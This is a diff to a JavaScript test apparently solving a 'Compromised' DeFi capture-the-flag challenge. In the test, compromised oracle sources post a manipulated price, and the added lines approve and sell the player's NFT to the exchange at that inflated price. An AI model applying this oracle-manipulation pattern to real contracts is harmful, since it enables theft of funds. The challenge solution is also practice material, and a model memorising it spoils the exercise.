@@ -66,6 +66,17 @@ describe("Compromised challenge", function () {
     await setPrices1.wait();
     const setPrices2 = await oracle.connect(source2).postPrice(symbol, balanceExchange);
     await setPrices2.wait();
+
+    //get the IDs of the NFT that player owns
+    expect(await nftToken.ownerOf(0)).to.equal(player.address);
+
+    //approve the NFTs for the exchange
+    const approve0 = await nftToken.connect(player).approve(exchange.address, 0);
+    await approve0.wait();
+
+    //sell the NFTs to the exchange
+    const sellNFT0 = await exchange.connect(player).sellOne(0);
+    await sellNFT0.wait();
   });
 
   after(async function () {
